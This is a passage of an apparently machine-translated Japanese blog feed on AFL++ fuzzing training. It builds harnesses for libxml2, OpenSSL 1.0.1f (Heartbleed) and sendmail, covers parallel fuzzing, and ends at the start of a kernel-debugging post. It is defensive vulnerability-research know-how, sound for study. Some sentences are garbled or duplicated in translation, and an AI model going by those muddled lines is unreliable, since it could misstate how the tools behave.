seems to be built with ASAN and you have a</span><br><span class="line">    restrictive memory limit configured, this is expected; please read</span><br><span class="line">    /usr/local/share/doc/afl/notes_for_asan.md for help.</span><br><span class="line"></span><br><span class="line">[-] PROGRAM ABORT : Fork server crashed with signal 6</span><br><span class="line">         Location : afl_fsrv_start(), src/afl-forkserver.c:76</span><br></pre></td></tr></table></figure><p>解決策としては、-m noneを追加して、メモリ制限を解除する。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i in -o out ./fuzzer @@</span><br></pre></td></tr></table></figure><p>不一会就会跑出crash，重现分析崩溃现场如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">==21614==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x621000002500 at pc 0x00000057da50 bp 0x7fffffffe070 sp 0x7fffffffe068</span><br><span class="line">READ of size 1 at 0x621000002500 thread T0</span><br><span class="line">    #0 0x57da4f in xmlParseXMLDecl /home/f0cus7/fuzz/libxml2/parser.c:10666:2</span><br><span class="line">    #1 0x57eed9 in xmlParseDocument /home/f0cus7/fuzz/libxml2/parser.c:10771:2</span><br><span class="line">    #2 0x5bfbbf in xmlDoRead /home/f0cus7/fuzz/libxml2/parser.c:15298:5</span><br><span class="line">    #3 0x5bfbbf in xmlReadFile /home/f0cus7/fuzz/libxml2/parser.c:15360:13</span><br><span class="line">    #4 0x4c6080 in main /home/f0cus7/fuzz/afl-training/challenges/libxml2/./harness.c:20:11</span><br><span class="line">    #5 0x7ffff6c07b96 in __libc_start_main /build/glibc-2ORdQG/glibc-2.27/csu/../csu/libc-start.c:310</span><br><span class="line">    #6 0x41c369 in _start (/home/f0cus7/fuzz/afl-training/challenges/libxml2/fuzzer+0x41c369)</span><br><span class="line"></span><br><span class="line">0x621000002500 is located 0 bytes to the right of 4096-byte region [0x621000001500,0x621000002500)</span><br><span class="line">allocated by thread T0 here:</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    // parser.c:10666</span><br><span class="line">    MOVETO_ENDTAG(CUR_PTR);</span><br><span class="line">    NEXT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// include/libxml/parseInternals.h: 297</span><br><span class="line">#define MOVETO_ENDTAG(p)                        \</span><br><span class="line">    while ((*p) &amp;&amp; (*(p) != &#x27;&gt;&#x27;)) (p)++</span><br></pre></td></tr></table></figure><p>可以看到应该是由于*p访问字符串末尾越界导致的，实质上它不算是漏洞，而是正常的行为。</p><p>将它进行patch，将该函数添加到asan的白名单之中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__((no_sanitize_address)) MOVETO_ENDTAG_PATCH(xmlChar *p)</span><br><span class="line">&#123;</span><br><span class="line">    while ((*p) &amp;&amp; (*(p) != &#x27;&gt;&#x27;)) (p)++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ハーネスと同様にlibxml2をコンパイルして再度実行すると、簡単にクラッシュすることはない。</p><p>ご感想<br>パッチを当てた後、クラッシュを実行するのは難しいので、主に以下の方法でファズテストを効率的に実行できるかを考えてください。</p><ul><li>より効率的なxmlサンプルの提供、サンプルのさらなる改良。</li><li>より多くの libxml2 インターフェースのファズテストを行い、さらに複雑なハーネスを作成した。</li><li>harness.cをより効率的にするための改良を行いました。</li></ul><p>1つ目は、fuzzdataのxmlデータなど、インターネット上でより有効なxmlファイルを探し、afl-cminやafl-tminツールを使ってサンプルを絞り込むことで、実現できる。</p><p>もうひとつは、公式マニュアルを読んで、ハーネスがより多くのデータ・インターフェースをカバーし、より複雑な操作を行えるようにすることでした。</p><p>3つ目は、AFL-FUZZに従ってllvmを有効にしてharness.cを改善することです。 llvmを有効にしてafl-clang-fastでharnessをコンパイルすると、__AFL_LOOPをコードに追加してAFL persistent modeを使ってフロックを削減し、さらなる効率化を図ります。</p><p>下記のように、__AFL_LOOPを追加することで、aflは一旦処理を開始し、その後に指定された数（1000）に応じて1000個のサンプルを生成し、次の処理を再開するまでに1000回実行し、フォークの回数を減らして効率を向上させます。 また、ファジーテストにaflを使用する代わりに、プログラム単体で実行するとループが動作しないため、解析クラッシュサイトを再現する場合でも、同じプログラムを使用することができるという効果を得ることができます。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while (__AFL_LOOP(1000))</span><br><span class="line">   &#123;</span><br><span class="line">       XXXXXX</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>そこで、上記のハーネスを以下のように修正し、コンパイルして再度ファズテストを行ったところ、効率が大幅に向上したことが確認できます（1000回&#x2F;秒から6000回&#x2F;秒に）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;libxml/parser.h&quot;</span><br><span class="line">#include &quot;libxml/tree.h&quot;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    if (argc != 2)</span><br><span class="line">        return -1;</span><br><span class="line"></span><br><span class="line">    xmlDocPtr doc; /* the resulting document tree */</span><br><span class="line"></span><br><span class="line">    while (__AFL_LOOP(1000)) &#123;</span><br><span class="line"></span><br><span class="line">        doc = xmlReadFile(argv[1], NULL, 0);</span><br><span class="line">        if (doc != NULL) &#123;</span><br><span class="line">            xmlFreeDoc(doc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlCleanupParser();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="heartbleed"><a href="#heartbleed" class="headerlink" title="heartbleed"></a>heartbleed</h5><p>heartbleedの脆弱性は古典的なものですが、もちろんこの脆弱性解析がこの記事の主目的ではなく、この実験の目的は、aflを使って脆弱性のクラッシュポイントを掘り起こす方法です。</p><p>heartbleedの脆弱性は古典的なものですが、もちろんこの脆弱性解析がこの記事の主目的ではなく、この実験の目的は、aflを使って脆弱性のクラッシュポイントを掘り起こす方法です。</p><p>Heartbleed 脆弱性は CVE-2014-0160 で、OpenSSL バージョン 1.0.1 の深刻な脆弱性です。 この脆弱性はメモリオーバーランを引き起こし、攻撃者はリモートから OpenSSL サーバメモリに格納された 64K のデータを読み取ることができます。 影響を受けるバージョン： OpenSSL バージョン 1.0.1, 1.0.1a, 1.0.1b, 1.0.1c, 1.0.1d, 1.0.1e, 1.0.1f, OpenSSL 1.0.2 の Beta 1, など。</p><p>tlsデータ転送処理を以下に示します。opensslはtls&#x2F;ssl転送プロトコルをサポートするほど友好的です。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Client                                             Server</span><br><span class="line">------                                             ------</span><br><span class="line"></span><br><span class="line">                           (1)</span><br><span class="line">ClientHello             --------&gt;                                 |</span><br><span class="line">                                              ServerHello         |</span><br><span class="line">                                             Certificate*         |</span><br><span class="line">                                       ServerKeyExchange*         |</span><br><span class="line">                                      CertificateRequest*         |</span><br><span class="line">                           (2)                                    |</span><br><span class="line">                        &lt;--------         ServerHelloDone         |</span><br><span class="line">Certificate*                                                      |</span><br><span class="line">ClientKeyExchange                                                 |--- HANDSHAKE</span><br><span class="line">CertificateVerify*                                                |</span><br><span class="line">[ChangeCipherSpec]                                                |</span><br><span class="line">                           (3)                                    |</span><br><span class="line">Finished                --------&gt;                                 |</span><br><span class="line">                                       [ChangeCipherSpec]         |</span><br><span class="line">                           (4)                                    |</span><br><span class="line">                        &lt;--------                Finished         |</span><br><span class="line"></span><br><span class="line">Application Data        &lt;-------&gt;        Application Data</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BIOは、opensslが実装するtls&#x2F;sslプロトコルフローにおいてより重要な概念の1つであり、データをさらにカプセル化したものです。 具体的に参照できる記事は以下の通りです。</p><ul><li>Using OpenSSL with memory BIOs</li><li>OpenSSL BIO_s_mem example</li><li>Directly Read&#x2F;Write Handshake data with Memory BIO</li></ul><p>ここでは、ファジーテストに関連する部分の始め方について説明します。</p><p>まず、マニュアルに従ってopenssl 1.0.1fをコンパイルします。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/openssl/openssl.git</span><br><span class="line">git checkout OpenSSL_1_0_1f</span><br><span class="line">CC=afl-clang-fast CXX=afl-clang-fast++ ./config -d</span><br><span class="line">AFL_USE_ASAN=1 make</span><br></pre></td></tr></table></figure><p>コンパイルしたら、次はハーネスを書いて、handshake.ccのキーコードを見ます。 Memory BIOサーバーを開き、BIO_write関数を呼び出してBIOキューにデータを書き込んでいるのがわかりますが、データは未定義です。 ハーネスを完成させるためには、主にデータを定義することが必要です。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">  static SSL_CTX *sctx = Init();</span><br><span class="line">  SSL *server = SSL_new(sctx);</span><br><span class="line">  BIO *sinbio = BIO_new(BIO_s_mem());</span><br><span class="line">  BIO *soutbio = BIO_new(BIO_s_mem());</span><br><span class="line">  SSL_set_bio(server, sinbio, soutbio);</span><br><span class="line">  SSL_set_accept_state(server);</span><br><span class="line"></span><br><span class="line">  /* TODO: To spoof one end of the handshake, we need to write data to sinbio</span><br><span class="line">   * here */</span><br><span class="line">  BIO_write(sinbio, data, size);</span><br><span class="line"></span><br><span class="line">  SSL_do_handshake(server);</span><br><span class="line">  SSL_free(server);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>データをバッファとして定義し、そのデータを標準入力から取得して、aflにバリアントデータを提供することができます、最終的なメイン関数は以下のようになります。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">  static SSL_CTX *sctx = Init();</span><br><span class="line">  SSL *server = SSL_new(sctx);</span><br><span class="line">  BIO *sinbio = BIO_new(BIO_s_mem());</span><br><span class="line">  BIO *soutbio = BIO_new(BIO_s_mem());</span><br><span class="line">  SSL_set_bio(server, sinbio, soutbio);</span><br><span class="line">  SSL_set_accept_state(server);</span><br><span class="line"></span><br><span class="line">  /* TODO: To spoof one end of the handshake, we need to write data to sinbio</span><br><span class="line">   * here */</span><br><span class="line">  char data [0x100];</span><br><span class="line">  size_t size = read(STDIN_FILENO, data, 0x100);</span><br><span class="line">  if(size == -1) &#123;</span><br><span class="line">      return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  BIO_write(sinbio, data, size);</span><br><span class="line"></span><br><span class="line">  SSL_do_handshake(server);</span><br><span class="line">  SSL_free(server);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ハーネスをコンパイルするためのコマンドは以下のとおりです。 -ldl は、ライブラリに接続するようにコネクタに指示します。 このライブラリには、dlopenやdlsymなどの関数、すなわちダイナミックリンクによるライブラリの実行時読み込みをサポートするライブラリが含まれています。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AFL_USE_ASAN=1 afl-clang-fast++ -g handshake.cc ~/Desktop/openssl/libcrypto.a ~/Desktop/openssl/libssl.a ~/Desktop/openssl/libcrypto.a ~/Desktop/openssl/libssl.a -o handshake -I ~/Desktop/openssl/include -ldl</span><br></pre></td></tr></table></figure><p>変異のインプットとなるシードファイルを作成します。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir in</span><br><span class="line">echo 11111 &gt; in/seed</span><br></pre></td></tr></table></figure><p>ファイナルファズ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i in -o out ./handshake</span><br></pre></td></tr></table></figure><p>しばらく走って、無事クラッシュがなくなった後。</p><p>AFL_USE_ASAN&#x3D;1 afl-clang-fast++ -g handshake.cc &#x2F;home&#x2F;lzt&#x2F;openssl&#x2F;libcrypto.a &#x2F;home&#x2F;lzt&#x2F;openssl&#x2F;libssl.a  -o handshake -I ~&#x2F;Desktop&#x2F;openssl&#x2F;include -ldl</p><p>ANSWERS.mdとHINTS.mdを見ると、ASANが有効になっているので、docs&#x2F;notes_for_asan.txtを読むと良いと書いてあります。 ドキュメントを読んでみると、ファズのためにASANを有効にすると、メモリを600-800m程度消費するので32ビットプログラムを実行すると良いことがわかりますが、一方で 64bitの場合、消費するメモリは17.5TB～20TB程度となるため、64bitのプログラムを直接実行するとエラーが発生する可能性があります。</p><p>どうしても実行したい場合は、root 権限で asan_cgroups&#x2F;limit_memory.sh スクリプトを呼び出します (sudo ~&#x2F;AFLplusplus&#x2F;examples&#x2F;asan_cgroups&#x2F;limit_memory.sh -u fuzzer afl-fuzz -i in) 。-o out -m none . &#x2F;handshake); 上記のように -m none を渡して実行することもできますが、この場合、プログラムがメモリを過剰に消費してしまい、システムによって強制終了される可能性があります。</p><h5 id="sendmail-x2F-1301"><a href="#sendmail-x2F-1301" class="headerlink" title="sendmail&#x2F;1301"></a>sendmail&#x2F;1301</h5><h6 id="基础知识-parallel-fuzzing"><a href="#基础知识-parallel-fuzzing" class="headerlink" title="基础知识-parallel fuzzing"></a>基础知识-parallel fuzzing</h6><p>マルチコアシステムで実行する場合の説明によると、ファズの効率を最大にするために、複数のafl-fuzzを起動するか、並列ファジングと呼ばれる複数のシステムでafl-fuzzを実行するのが良いとのことです。</p><p>並列ファジングのために読むべきマニュアルは docs&#x2F;parallel_fuzzing.txt で、このドキュメントを一通り読んだ後に、基本的なことを簡単にメモしておきます。</p><p>afl-fuzzは1つのCPUコアを占有するので、マルチコア（nコア）のシステムでは、最大n個のafl-fuzzの起動が許され、1つしか起動しないのはシステムリソースの無駄遣いである。</p><p>システム上で並列ファズを開始する方法は比較的簡単で、出力用の同期ディレクトリsync_dirを作成し、起動時に個々のシステムに名前を付けます。</p><p>最初のインスタンス起動コマンドを以下に示しますが、マスター（-M）を指定する必要があります。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01 [...other stuff...]</span><br></pre></td></tr></table></figure><p>残りのインスタンスも同様にクライアントとして指定して起動する（sencondary -S）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02 [...other stuff...]</span><br><span class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03 [...other stuff...]</span><br></pre></td></tr></table></figure><p>すべてのインスタンスは、起動後、その状態を別のディレクトリに保存します（例．</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path/to/sync_dir/fuzzer01/</span><br></pre></td></tr></table></figure><p>各インスタンスは一定時間後にシンクフォルダをスキャンし、関心を持っているサンプルをすべて自分のサンプルライブラリにシンクします。</p><p>Mと-Sの違いは、マスターインスタンスが決定論的なチェックを行い、セカンダリインスタンスがランダムな微調整を行う点です。 決定論的なチェックとランダムな微調整がよくわからない。マスターはすべてのインスタンスに対してある決定を下す必要があるが、それ以外は必要ないように感じられる。 特にターゲットがより複雑な場合、すべてのインスタンスを-Sで起動することが可能であり、-Mで起動する複数のインスタンスは不要であり、リソースの浪費になります。</p><p>複数のシステムで並列ファズを開始することは、単一のシステムよりも若干複雑です。主な違いは、システム間の同期を取るためのスクリプトを書かなければならないことです。</p><ul><li><p>各システムにssh認証でログインし、以下の例のようにファズデータ（&#x2F;path&#x2F;to&#x2F;sync_dir&#x2F;<fuzzer_id>&#x2F;queue&#x2F;）を保存してください。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash for s in &#123;1..10&#125;; do ssh user@host$&#123;s&#125; &quot;tar -czf - sync/host$&#123;s&#125;_fuzzid*/[qf]*&quot; &gt;host$&#123;s&#125;.tgz done</span><br></pre></td></tr></table></figure></li><li><p>上記で保存したデータファイルを、以下のように他のマシンのパスと同期させます。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash for s in &#123;1..10&#125;; do for d in &#123;1..10&#125;; do test &quot;$s&quot; = &quot;$d&quot; &amp;&amp; continue ssh user@host$&#123;d&#125; &#x27;tar -kxzf -&#x27; &lt;host$&#123;s&#125;.tgz done done</span><br></pre></td></tr></table></figure></li></ul><p>experimental&#x2F;distributed_fuzzing&#x2F; パスの下に対応するサンプルがあるので、それを参照することができます。</p><p>なお、クラッシュはインスタンス間で同期されないので、ユーザー自身が確認する必要があります。</p><h6 id="fuzz-sendmail"><a href="#fuzz-sendmail" class="headerlink" title="fuzz sendmail"></a>fuzz sendmail</h6><p>sendmailはSMTPサービスのソースコードで、抽出されたコードの主な機能は7ビットMIMEと8ビットMIMEのフォーマット間の変換である。</p><p>ハーネスでは、以下のメインに示すように、ファイルからデータを受け取り、mime7to8を呼び出して変換しています。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;my-sendmail.h&quot;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)&#123;</span><br><span class="line"></span><br><span class="line">  HDR *header;</span><br><span class="line">  register ENVELOPE *e;</span><br><span class="line">  FILE *temp;</span><br><span class="line"></span><br><span class="line">  assert (argc == 2);</span><br><span class="line">  temp = fopen (argv[1], &quot;r&quot;);</span><br><span class="line">  assert (temp != NULL);</span><br><span class="line"></span><br><span class="line">  header = (HDR *) malloc(sizeof(struct header));</span><br><span class="line"></span><br><span class="line">  header-&gt;h_field = (char *) malloc(sizeof(char) * 100);</span><br><span class="line">  header-&gt;h_field = &quot;Content-Transfer-Encoding&quot;;</span><br><span class="line">  header-&gt;h_value = (char *) malloc(sizeof(char) * 100);</span><br><span class="line">  header-&gt;h_value = &quot;quoted-printable&quot;;</span><br><span class="line"></span><br><span class="line">  e = (ENVELOPE *) malloc(sizeof(struct envelope));</span><br><span class="line"></span><br><span class="line">  e-&gt;e_id = (char *) malloc(sizeof(char) * 50);</span><br><span class="line">  e-&gt;e_id = &quot;First Entry&quot;;</span><br><span class="line"></span><br><span class="line">  e-&gt;e_dfp = temp;</span><br><span class="line">  mime7to8(header, e);</span><br><span class="line">  fclose(temp);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>makefileは以下のとおりで、最終的にコンパイルされたプログラムはm1-badとなります。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CFLAGS ?= -g</span><br><span class="line"></span><br><span class="line">all:    m1-bad</span><br><span class="line"></span><br><span class="line">clean:  </span><br><span class="line">    rm -f *-bad *-ok</span><br><span class="line"></span><br><span class="line">m1-bad: mime1-bad.c main.c </span><br><span class="line">    $&#123;CC&#125; $&#123;CFLAGS&#125; -o m1-bad mime1-bad.c main.c -I .</span><br></pre></td></tr></table></figure><p>コンパイルコマンドは以下の通りです。</p><p>CC&#x3D;afl-clang-fast AFL_HARDEN&#x3D;1 make</p><p>機能のテスト。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ echo hi &gt; input</span><br><span class="line"></span><br><span class="line">$ ./m1-bad input</span><br><span class="line">buf-obuf=4294967232</span><br><span class="line">obp-obuf=0</span><br><span class="line">canary-obuf=4294967222</span><br><span class="line">canary = GOOD</span><br><span class="line">obuf = hi</span><br><span class="line"></span><br><span class="line">canary should be GOOD</span><br><span class="line">canary = GOO</span><br></pre></td></tr></table></figure><p>シードファイルを作成する。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir in</span><br><span class="line"></span><br><span class="line">$ echo hi &gt; in/seed</span><br></pre></td></tr></table></figure><p>対応するパスも、対応するアウトディレクトリに生成されます。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls out</span><br><span class="line">fuzzer01  fuzzer02  fuzzer03  fuzzer04</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFLplusplus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxカーネルデバッグメソッドまとめ</title>
      <link href="/2017/03/26/debug/linux/linux_kernel_debug/"/>
      <url>/2017/03/26/debug/linux/linux_kernel_debug/</url>
      
        <content type="html"><![CDATA[<p>カーネル開発がユーザー空間の開発より難しい要因の1つは、カーネルのデバッグの難しさである。 カーネルエラーはシステムダウンにつながることが多く、何が問題だったのか現場を保存することが難しい。 カーネルのデバッグで重要なのは、カーネルを深く理解することです。</p><h4 id="I-コミッショニング準備"><a href="#I-コミッショニング準備" class="headerlink" title="I コミッショニング準備"></a>I コミッショニング準備</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- バグが確認されています。</span><br><span class="line">- バグを含むカーネルのバージョン番号を解析して、どのバージョンでバグが発生したかを調べる必要があり、問題解決に非常に役立つ。 二項対立の検索で、バグが発生したバージョン番号を徐々に特定することができる。</span><br><span class="line">- カーネルコードの理解が深ければ深いほどよく、ちょっとした運も必要です。</span><br><span class="line">- このバグは再現可能です。 再発パターンが見つかれば、原因究明はそう遠くないはずです。</span><br><span class="line">- システムを最小化する。 バグを発生させる要因をひとつひとつ排除していく。</span><br></pre></td></tr></table></figure><h4 id="II-カーネルに発生するバグ"><a href="#II-カーネルに発生するバグ" class="headerlink" title="II カーネルに発生するバグ"></a>II カーネルに発生するバグ</h4><p>カーネルのバグも多様です。 その理由はさまざまで、見た目もさまざまです。 ソースコードに隠されたバグから、目に見える形で明らかになったバグまで、その発症は多くの場合、連鎖的に引き起こされる。 カーネルデバッグは難しいですが、努力と理解次第で楽しくチャレンジできるかもしれません。</p><h4 id="III-カーネルデバッグコンフィギュレーションオプション"><a href="#III-カーネルデバッグコンフィギュレーションオプション" class="headerlink" title="III カーネルデバッグコンフィギュレーションオプション"></a>III カーネルデバッグコンフィギュレーションオプション</h4><h5 id="1-カーネル構成"><a href="#1-カーネル構成" class="headerlink" title="1 カーネル構成"></a>1 カーネル構成</h5><p>カーネルデバッグを可能にするために、カーネルコンフィギュレーションにいくつかの項目が追加されました。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> Kernel hacking  ---&gt;      </span><br><span class="line"></span><br><span class="line">[*]   Magic SysRq key </span><br><span class="line"></span><br><span class="line">[*]   Kernel debugging </span><br><span class="line"></span><br><span class="line">[*]   Debug slab memory allocations   </span><br><span class="line"></span><br><span class="line">[*]   Spinlock and rw-lock debugging: basic checks </span><br><span class="line"></span><br><span class="line">[*]   Spinlock debugging: sleep-inside-spinlock checking </span><br><span class="line"></span><br><span class="line">           [*]   Compile the kernel with debug info   </span><br><span class="line"></span><br><span class="line">Device Drivers  ---&gt;   </span><br><span class="line"></span><br><span class="line">           Generic Driver Options  ---&gt; </span><br><span class="line"></span><br><span class="line">           [*]   Driver Core verbose debug messages </span><br><span class="line"></span><br><span class="line">General setup  ---&gt; </span><br><span class="line"></span><br><span class="line">           [*]   Configure standard kernel features (<span class="keyword">for</span> small systems)  ---&gt; </span><br><span class="line"></span><br><span class="line">           [*]   Load all symbols <span class="keyword">for</span> debugging/ksymoops</span><br></pre></td></tr></table></figure><p>オプションを有効にする 例 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">slab layer debuggingスラブレイヤーデバッグオプション </span><br><span class="line"></span><br><span class="line">high-memory debuggingハイメモリーデバッギングオプション </span><br><span class="line"></span><br><span class="line">I/O mapping debuggingI/Oマッピングのデバッグオプション </span><br><span class="line"></span><br><span class="line">spin-lock debuggingスピンロック・デバッグ・オプション </span><br><span class="line"></span><br><span class="line">stack-overflow スタックオーバーフローチェックオプション </span><br><span class="line"></span><br><span class="line">sleep-inside-spinlock checkingスリープインサイドスピンロックチェック</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-アトミック操作のデバッグ"><a href="#2-アトミック操作のデバッグ" class="headerlink" title="2 アトミック操作のデバッグ"></a>2 